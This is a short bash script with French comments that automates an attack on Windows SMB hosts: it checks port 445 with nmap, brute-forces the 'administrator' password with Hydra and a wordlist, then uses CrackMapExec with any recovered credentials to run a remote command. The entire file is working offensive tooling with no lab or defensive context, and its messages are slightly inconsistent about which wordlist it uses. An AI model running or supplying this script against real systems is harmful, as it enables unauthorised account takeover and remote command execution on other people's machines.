#!/bin/bash

# Vérification si un argument a été fourni
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <TARGET_IP>"
    exit 1
fi

TARGET_IP="$1"

# Fonction pour scanner tous les ports et services
scan_port() {
    echo "Scanning all ports and services on $TARGET_IP..."
    local scan_results=$(nmap -p 445 -sV $TARGET_IP)
    echo "$scan_results"
    # Check for port 445 open
    if echo "$scan_results" | grep -q "445/tcp open"; then
        return 0 # Port 445 est ouvert
    else
        return 1 # Port 445 n'est pas ouvert
    fi
}

# Fonction pour effectuer une attaque Hydra
hydra_attack() {
    local target_ip="$1"
    echo "Performing Hydra attack on $target_ip using /wordlists/rockyou.txt"
    local attack_results=$(hydra -l administrator -P /usr/share/wordlists/john.txt smb://$target_ip -t 4 -vV)
    echo "$attack_results"
    
    # Extraction des informations de connexion réussies
    local success_login=$(echo "$attack_results" | grep -oP 'login:\s+\K[^ ]+')
    local success_password=$(echo "$attack_results" | grep -oP 'password:\s+\K[^ ]+')
    
    if [ ! -z "$success_login" ] && [ ! -z "$success_password" ]; then
        echo "Login and password found: $success_login / $success_password"
        # Enregistrer les informations de connexion pour les utiliser plus tard
        LOGIN_FOUND="$success_login"
        PASSWORD_FOUND="$success_password"
        return 0 # Succès
    else
        echo "Hydra did not find the login/password."
        return 1 # Échec
    fi
}

# Fonction pour se connecter avec CrackMapExec
cme_connect() {
    local target_ip="$1"
    local login="$2"
    local password="$3"
    echo "Attempting to connect using CrackMapExec..."
    crackmapexec smb $target_ip -u "$login" -p "$password" -x 'whoami'
}

# Main script execution
if scan_port; then
    if hydra_attack "$TARGET_IP"; then
        cme_connect "$TARGET_IP" "$LOGIN_FOUND" "$PASSWORD_FOUND"
    fi
else
    echo "Port 445 is not open or accessible. Exiting..."
fi
